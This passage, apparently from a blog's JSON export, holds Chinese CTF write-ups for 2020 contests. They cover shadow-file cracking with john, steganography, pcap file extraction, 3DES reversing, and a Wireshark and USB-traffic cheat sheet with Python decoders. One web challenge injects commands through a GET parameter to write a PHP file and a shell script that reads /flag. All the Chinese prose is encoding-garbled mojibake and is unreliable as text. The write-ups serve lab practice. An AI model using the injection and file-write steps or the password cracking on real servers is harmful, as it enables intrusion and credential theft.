´è§£æˆ‘çš„å¯†ç å— flagå†…å®¹ä¸ºå¯†ç çš„32ä½å°å†™çš„md5ï¼Œè¯·ç”¨unctf{}åŒ…è£¹å­—ç¬¦ä¸² shadowæ–‡ä»¶ä¸­å€’æ•°ç¬¬äºŒè¡Œï¼Œç”¨johnå‘½ä»¤ç ´è§£å¼±å£ä»¤ï¼š john --show shadow å¾—åˆ°å¯†ç ï¼Œmd5å¤„ç†å³flagã€‚ â€‹ EZ_IMAGEæ‰‹æ’¸æœ€ç»ˆè‚¯å®šèƒ½å‡ºæ¥ï¼Œä¸è¿‡å­¦åˆ°æ›´å¥½ç”¨çš„è‡ªåŠ¨åŒ–å§¿åŠ¿ï¼ˆmontage+gapsï¼‰ï¼Œé€‚ç”¨äºä»»ä½•æ‹¼å›¾é¢˜ï¼š å…ˆæŠŠ225å¼ å›¾ç”¨ImageMagickä¸­çš„montageå‘½ä»¤åˆæˆä¸€å¼ å¤§å›¾ï¼š montage *.jpg -tile 15x15 -geometry 60x60+0+0 out.jpg å¾—åˆ°ä¸€å¼ å¤§å›¾ä¹‹åï¼Œç”¨gapsæ¥è¿›è¡Œè¿˜åŸï¼š gaps --image=out.jpg --generations=40 --population=225 --size=60 --save â€‹ é›¶ æˆ‘çäº†çœ‹ä¸åˆ°flagäº† é›¶å®½å­—ç¬¦éšå†™ï¼Œå¯ä»¥åœ¨vimä¸­ç”¨vim -A xxx.txtæŸ¥çœ‹æ ¸å®ã€‚ å…¨é€‰å¤åˆ¶ï¼Œç”¨åœ¨çº¿å·¥å…·ç›´æ¥å–å‡ºflagã€‚ â€‹ YLBç»å¯†æ–‡ä»¶ æç¤º1ï¼šéœ€è¦æå–å‡ºä¸‰ä¸ªæ–‡ä»¶: *.pyc,*.py,*.zipæç¤º2ï¼šzipæ–‡ä»¶å¯ä»¥ä»¥åŸå§‹æ•°æ®çš„å½¢å¼å¯¼å‡ºHexå€¼ï¼Œå†å¯¼å…¥Winhex/010 Editorç„¶ååˆ å»éZipæ•°æ®éƒ¨åˆ†ï¼ˆè‡ªè¡Œç™¾åº¦Zipæ ¼å¼ WiresharkæŸ¥çœ‹æµé‡åŒ…ï¼Œè¿½è¸ªTCPæµï¼Œåˆ†åˆ«åœ¨æµ11ã€æµ16å’Œæµ20æµæå–å‡ºxor.pyã€secret.cpython-38.pycå’ŒYLBSB.zipä¸‰ä¸ªæ–‡ä»¶ã€‚ ç”¨uncompyle6è¿˜åŸpycæ–‡ä»¶ä¸ºsecret.pyæ–‡ä»¶æ‹¿åˆ°keyå€¼YLBSB?YLBNB!ï¼Œå†æ ¹æ®xor.pyä»£ç é€»è¾‘ï¼Œå°†keyä¸zipåŒ…ä¸­çš„YLBSB.xoræ–‡ä»¶16è¿›åˆ¶å€¼å¼‚æˆ–ï¼Œä¿å­˜å¾—åˆ°YLBSB.docxæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°flagã€‚ â€‹ å€’å½±16è¿›åˆ¶æŸ¥çœ‹exeæ–‡ä»¶å‘ç°æ˜¯jpgå›¾ï¼Œåœ¨å°¾éƒ¨å‘ç°4030B405ï¼Œå³ä¸ºå€’ç€å­˜å…¥çš„ä¸€æ®µ16è¿›åˆ¶zipæ–‡ä»¶ï¼Œå–å‡º16è¿›åˆ¶é€†åºè¿˜åŸï¼Œç”¨ARCHPRçº¯æ•°å­—è·‘å‡ºå¼±å£ä»¤å¾—åˆ°flagã€‚ â€‹ Otherè°ƒæŸ¥é—®å· è¯·å¤§å®¶è®¤çœŸå¡«å†™å“Ÿ~ åªæœ‰å‡ é“ï¼Œä¸å¤šï¼Œæœ€å¤šå ç”¨å¤§å®¶ä¸¤ä¸‰åˆ†é’Ÿâ€¦é—®å·åœ°å€ï¼šhttps://wj.qq.com/s2/7519766/6af6/æƒ³è¦å¤§å®¶ä¸€èµ·åæ§½ï¼ŸçŸ¥ä¹é“¾æ¥ï¼šhttps://www.zhihu.com/question/429290669/answer/1564365629 åé¦ˆå°±æ˜¯äº†ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"CTFshow åŸè°…æ¯","slug":"match-CTFshow-åŸè°…æ¯","date":"2020-11-11T16:13:12.000Z","updated":"2021-01-24T13:30:59.541Z","comments":true,"path":"2020/11/12/match-CTFshow-åŸè°…æ¯/","permalink":"https://lazzzaro.github.io/2020/11/12/match-CTFshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/","excerpt":"","text":"åŸè°…æ¯æ¯”èµ›é¢„å‘Šï¼šCTFshow åŸè°…æ¯å¹³å°ï¼šhttps://ctf.showå¼€å§‹ï¼š2020/11/11 00:00ç»“æŸï¼š2020/11/11 23:59å†…å®¹ï¼šæœ¬æ¬¡é‡‡ç”¨é—¯å…³æ¨¡å¼ï¼Œå¿…é¡»æŒ‰é¡ºåºè§£é¢˜ï¼Œå¦åˆ™æ— æ³•æ¬£èµç‹—è¡€çš„çˆ±æƒ…æ•…äº‹ã€‚è§„åˆ™ï¼š1 æ¯”èµ›æœŸé—´å¯ä»¥éšæ„è®¨è®ºï¼Œwpé¡»åœ¨æ¯”èµ›ç»“æŸåå‘å¸ƒï¼Œwpç»Ÿä¸€å‘å¸ƒåœ°å€ï¼šhttps://wp.ctf.show2 å…¬å¹³ç«æŠ€ï¼Œç‹¬ç«‹æ¯”èµ›3 æœåŠ¡å™¨ä¸è¦çˆ†ç ´ï¼Œä¸è¦æ”»å‡»æœåŠ¡å™¨ï¼Œä¸è¦æ‰«æ!!!4 å¥–å“ï¼šå¸½å­ä¸€ä¸ª(é¢œè‰²éšæœº) åŸè°…1 é™„ä»¶ï¼šyuanliang_1.zip å‹ç¼©åŒ…æœ‰ story.zip å’Œ åŸè°…1.pngï¼Œç¾¤é‡Œhint+æ‹ŸéŸ³è§£å¯†emojiï¼Œå¯†ç 1317bi77p9uï¼Œ è§£å‹æ‹¿åˆ° 1.jpg å’Œ å‰§æƒ…1.txtï¼ŒstegsolveæŸ¥çœ‹1.jpgçš„rgbé€šé“å‘ç°flagã€‚ â€‹ åŸè°…2 é™„ä»¶ï¼šyuanliang_2.zip å‹ç¼©åŒ…æœ‰æœªåŠ å¯†çš„ hint.txtï¼Œç«æ˜Ÿæ–‡è§£å¯†å¾—åˆ°è§£å‹å¯†é’¥ï¼Œè§£å‹æ‹¿åˆ°flag.txtå†…å®¹ã€‚ â€‹ åŸè°…3_æ¥ä»½è‰²å›¾ é™„ä»¶ï¼šyuanliang_3.zip Hint1: é˜¿ç‹¸2020å¹´11æœˆ11æ—¥10:49åœ¨ç¾¤é‡Œè¯´å¾—å¯¹ Hint2: ç¬¬ä¸€æ­¥ã€è‰²å›¾ä¸€åˆ†ä¸ºäºŒï¼ˆå¸¸è§æ–‡ä»¶æ ¼å¼/å¤´å°¾äº†è§£ä¸€ä¸‹ï¼‰ï¼›ç¬¬äºŒæ­¥ã€rrggbbrrggbbrrggbbâ€¦ï¼›ç¬¬ä¸‰æ­¥ã€ä½ çš„å·¥å…·æ›´æ–°äº†å— å‹ç¼©åŒ…æœ‰æœªåŠ å¯†çš„setu.zipï¼Œè§£å‹å¾—åˆ°setu.pngï¼Œ010editoråˆ†æå­˜åœ¨åŒå›¾ï¼Œforemoståˆ†è§£å¾—åˆ°ä¸¤å¼ pngã€‚ å°†setu.zipç”¨zstegè¿›è¡ŒLSBåˆ†æï¼Œå‘ç°éšè—çš„pngå›¾ï¼Œæå–å‡ºæ–°pngå›¾1ã€‚ ç»“åˆç›²æ°´å°æç¤ºï¼Œå°†foremoståˆ†è§£å‡ºçš„ä¸¤å¼ pngåŒæ ·ç”¨zstegè¿›è¡ŒLSBåˆ†æï¼Œåˆ†åˆ«æå–å‡ºæ–°pngå›¾2ã€å›¾3ã€‚ ç”¨githubä¸Šå„ç§ç›²æ°´å°è„šæœ¬ï¼Œä½¿ç”¨æ­£ç¡®è„šæœ¬å°è¯•è§£å›¾1ã€å›¾2ã€å›¾3ï¼Œæœ‰ä¸€ç§æƒ…å†µèƒ½å‡ºflagå›¾ã€‚ â€‹ åŸè°…4 åˆ—ç›®å½•å¯ä»¥çœ‹åˆ°å‰§æƒ…æ–‡ä»¶ Hint1: è€å‰è¾ˆè¯´è¿‡â€œæœ€å®‰å…¨çš„ç³»ç»Ÿå°±æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰â€ï¼Œæˆ‘æŠŠæ²¡ç”¨çš„å‘½ä»¤éƒ½åˆ äº†ï¼Œçœ‹ä½ è¿˜æ€ä¹ˆæ‰§è¡Œ Hint2: ä½ çŸ¥é“ç³»ç»Ÿç¯å¢ƒå˜é‡é‡Œçš„PATHæ˜¯å¹²ä»€ä¹ˆçš„å—ï¼Ÿ GETæ–¹å¼ä¼ å…¥å‚æ•°xbxï¼Œå‘ç°åªèƒ½ç”¨lsåˆ—ç›®å½•ï¼Œå°è¯•ç”¨echoå†™å…¥æ–‡ä»¶æˆåŠŸï¼Œå†™å…¥phpinfo()ï¼š echo &#39;&lt;?php phpinfo();?&gt;&#39; &gt; phpinfo.php è®¿é—®å‘ç°å­˜åœ¨open_basediré™åˆ¶ï¼Œè¯•è¿‡å„ç§open_basedirç»•è¿‡ã€disable_functionå†™bypassè¯»/flagå‡ä¸æˆåŠŸã€‚ æç¤ºç¯å¢ƒå˜é‡ï¼ŒæŸ¥çœ‹ï¼šecho $PATHï¼Œåˆ†åˆ«åˆ°å„è·¯å¾„ä¸‹æŸ¥çœ‹ï¼Œä»…å­˜ls/rm/shä¸‰ç§å‘½ä»¤ï¼ˆæ— æ³•æ‰§è¡Œå¸¸ç”¨å‘½ä»¤çš„åŸå› ï¼‰ã€‚ æœ‰shå‘½ä»¤ï¼Œä¸”å¯å†™å…¥æ–‡ä»¶ï¼Œå°è¯•å¾€æ ¹ç›®å½•å†™å…¥shellè„šæœ¬ï¼š echo -e &quot;%23!/bin/sh\\nwhile read line\\ndo\\necho \\$line\\ndone &lt; /flag&quot; &gt; ../../../read æˆåŠŸå†™å…¥ï¼Œå†æ‰§è¡Œ/bin/sh ../../../readå¾—flagã€‚ èµ›åè¿˜å­¦åˆ°å…¶ä»–å„ç§éªšå§¿åŠ¿ã€‚ â€‹ åŸè°…5-6æœªè§£ã€‚ â€‹ åŸè°…7_babyåŠ å¯† encrypt.exe -e flag.txt é™„ä»¶ï¼šencrypt.exeã€encrypted_flag.txt Hint1: maybe des? IDAè·Ÿè¿›mainå‡½æ•°ï¼Œå‘ç°24ä½å­—ç¬¦ä¸²123456788765432112345678ï¼Œå†è·Ÿè¿›åŠ å¯†å‡½æ•°sub_401E16ï¼š sub_401E16((__int64)&amp;v13, (__int64)argv, v44, (__int64)File, (__int64)&amp;v14, 1, v8, v9, v10, v11, 1); å‘ç°ä¼ å…¥çš„24ä¸ºå­—ç¬¦ä¸²åˆ†ä¸ºä¸‰ç»„åˆ†åˆ«é€šè¿‡å‡½æ•°sub_401B7Aå¤„ç†ï¼š sub_401B7A((void *)a1, (const void *)a2, v16, v14, 1);sub_401B7A((void *)a1, (const void *)a2, v16 + 8, v14, 0);sub_401B7A((void *)a1, (const void *)a2, v16 + 16, v14, 1); ç»“åˆæç¤ºDESï¼Œå¯çŸ¥ä¸º3DESåŠ å¯†ï¼ˆ24ä½å¯†é’¥ï¼Œä¸”ç¬¬ä¸€æ­¥å¤„ç†ä¼šå°†å¯†é’¥åˆ†æˆä¸‰ç»„å¯†é’¥åˆ†åˆ«å¤„ç†ï¼Œç¬¬ä¸€ç»„è§£å¯†ï¼Œç¬¬äºŒç»„åŠ å¯†ï¼Œç¬¬ä¸‰ç»„è§£å¯†ï¼Œå¯¹åº”sub_401E16æœ€åä¸€ä¸ªå‚æ•°å€¼ï¼‰ã€‚ ç”¨åœ¨çº¿è§£å¯†å·¥å…·è§£å¯†å¯†æ–‡å³å¯å¾—flagã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"æµé‡åˆ†æ","slug":"misc-æµé‡åˆ†æ","date":"2020-11-07T17:01:00.000Z","updated":"2023-08-26T16:34:46.116Z","comments":true,"path":"2020/11/08/misc-æµé‡åˆ†æ/","permalink":"https://lazzzaro.github.io/2020/11/08/misc-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"â€‹ wiresharkè¿‡æ»¤å™¨ æŠ“åŒ…è¿‡æ»¤å™¨ æŠ“å–æºåœ°å€ä¸º192.168.1.1ï¼Œç›®çš„ç«¯å£ä¸º80çš„æµé‡ 1src host 192.168.1.1 &amp;&amp; dst port 80 æŠ“å–192.168.1.1å’Œ192.168.1.2çš„æµé‡ 1host 192.168.1.1 || host 192.168.1.2 è¿‡æ»¤macåœ°å€ï¼š 123ether host 00:88:ca:86:f8:0dether src host 00:88:ca:86:f8:0dether dst host 00:88:ca:86:f8:0d è¿‡æ»¤IPåœ°å€ï¼š 123host 192.168.1.1src host 192.168.1.1dst host 192.168.1.1 è¿‡æ»¤ç«¯å£ï¼š 1234port 80!port 80dst port 80src port 80 è¿‡æ»¤åè®®ï¼š 12arpicmp ç»“åˆé€»è¾‘ç¬¦å·ç»¼åˆè¿‡æ»¤ 1host 192.168.1.1 &amp;&amp; port 8080 æ˜¾ç¤ºè¿‡æ»¤å™¨ è¿‡æ»¤IPåœ°å€ï¼š 123ip.addr == 192.168.1.1 è¿‡æ»¤è¯¥åœ°å€çš„åŒ…ip.src == 172.16.1.1 è¿‡æ»¤æºåœ°å€ä¸ºè¯¥åœ°å€çš„åŒ…ip.dst == 172.16.1.1 è¿‡æ»¤ç›®æ ‡åœ°å€ä¸ºè¯¥åœ°å€çš„åŒ… è¿‡æ»¤ç«¯å£ï¼š 123tcp.port == 80 è¿‡æ»¤tcpä¸­ç«¯å£å·ä¸º80çš„åŒ…tcp.flags.syn == 1 è¿‡æ»¤synè¯·æ±‚ä¸º1çš„åŒ…tcp.flags.ack == 1 è¿‡æ»¤ackè¯·æ±‚ä¸º1çš„åŒ… ç»“åˆé€»è¾‘ç¬¦ç»¼åˆè¿‡æ»¤ï¼š 1ip.src == 192.168.1.1 and ip.dst == 172.16.1.1 â€‹ USBæµé‡å·¥å…·ï¼šknm é”®ç›˜æµé‡USBåè®®æ•°æ®éƒ¨åˆ†åœ¨Leftover Capture DataåŸŸä¸­ï¼Œæ•°æ®é•¿åº¦ä¸ºå…«ä¸ªå­—èŠ‚ã€‚å…¶ä¸­é”®ç›˜å‡»é”®ä¿¡æ¯é›†ä¸­åœ¨ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¸­ã€‚é”®ä½æ˜ å°„å…³ç³»å‚è€ƒï¼šã€ŠUSBé”®ç›˜åè®®ä¸­é”®ç ã€‹ä¸­çš„HID Usage IDã€‚ æ­¥éª¤ï¼š tsharkå‘½ä»¤æå–cap data tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txtï¼ˆå»ç©ºè¡Œï¼‰ å°†æ•°æ®è¿˜åŸæˆé”®ä½ æå–å‡ºæ¥çš„æ•°æ®å¯èƒ½ä¼šå¸¦å†’å·ï¼Œä¹Ÿå¯èƒ½ä¸å¸¦ï¼Œä½†æ˜¯ä¸€èˆ¬çš„è„šæœ¬éƒ½ä¼šæŒ‰ç…§æœ‰å†’å·çš„æ•°æ®æ¥è¯†åˆ«ã€‚ æœ‰å†’å·æ—¶æå–æ•°æ®çš„[6:8]ï¼Œæ— å†’å·æ—¶æ•°æ®åœ¨[4:6]ã€‚ åŠ å†’å·ï¼š 1234567891011121314151617f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==16: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close() è¿˜åŸé”®ä½ï¼š 1234567891011121314151617181920212223#python2#è„šæœ¬1mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(&#x27;out.txt&#x27;)for line in keys: if line[0]!=&#x27;0&#x27; or line[1]!=&#x27;0&#x27; or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27;: continue nums.append(int(line[6:8],16))keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#x27;[unknown]&#x27;print &#x27;output :\\n&#x27; + output 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#python3#è„šæœ¬2normalKeys = &#123; &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123; &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#x27;out.txt&#x27;)for line in keys: try: if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;] else: output += [&#x27;[unknown]&#x27;] except: passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)): try: a=output.index(&#x27;&lt;DEL&gt;&#x27;) del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint (&#x27;output :&#x27; + &quot;&quot;.join(output)) â€‹ é¼ æ ‡æµé‡USBåè®®é¼ æ ‡æ•°æ®éƒ¨åˆ†åœ¨Leftover Capture DataåŸŸä¸­ï¼Œæ•°æ®é•¿åº¦ä¸ºå››ä¸ªå­—èŠ‚ã€‚ ç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é”®ï¼Œå½“å–0x00æ—¶ä»£è¡¨æ²¡æœ‰æŒ‰é”®ï¼Œä¸º0x01æ—¶ä»£è¡¨æŒ‰å·¦é”®ï¼Œä¸º0x02æ—¶ä»£è¡¨æŒ‰å³é”®ã€‚ ç¬¬äºŒä¸ªå­—èŠ‚å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªsigned byteç±»å‹ï¼Œå…¶æœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œå½“è¿™ä¸ªå€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨é¼ æ ‡æ°´å¹³å³ç§»å¤šå°‘åƒç´ ï¼Œä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨æ°´å¹³å·¦ç§»å¤šå°‘åƒç´ ã€‚ ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¸ç¬¬äºŒå­—èŠ‚ç±»ä¼¼ï¼Œä»£è¡¨å‚ç›´ä¸Šä¸‹ç§»åŠ¨çš„åç§»ã€‚ æ­¥éª¤ï¼š tsharkå‘½ä»¤æå–cap data tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txtï¼ˆå»ç©ºè¡Œï¼‰ å°†é¼ æ ‡æ•°æ®è¿˜åŸé¼ æ ‡ç§»åŠ¨è½¨è¿¹ æå–å‡ºæ¥çš„æ•°æ®å¯èƒ½ä¼šå¸¦å†’å·ï¼Œä¹Ÿå¯èƒ½ä¸å¸¦ï¼Œä½†æ˜¯ä¸€èˆ¬çš„è„šæœ¬éƒ½ä¼šæŒ‰ç…§æœ‰å†’å·çš„æ•°æ®æ¥è¯†åˆ«ã€‚ æœ‰å†’å·æ—¶æå–æ•°æ®çš„[6:8]ï¼Œæ— å†’å·æ—¶æ•°æ®åœ¨[4:6]ã€‚ åŠ å†’å·ï¼š 1234567891011121314151617f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==8: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close() æµ‹è¯•ä¿¡æ¯éšè—ä½ç½® 123456789101112131415161718192021222324nums = []keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 2 : # 1 ä»£è¡¨å·¦é”® f.write(str(posx)) f.write(&#x27; &#x27;) f.write(str(posy)) f.write(&#x27;\\n&#x27;)f.close() gnuplotå°†åæ ‡è½¬åŒ–æˆå›¾åƒ gnuplot gnuplot&gt; plot &quot;xy.txt&quot; â€‹ 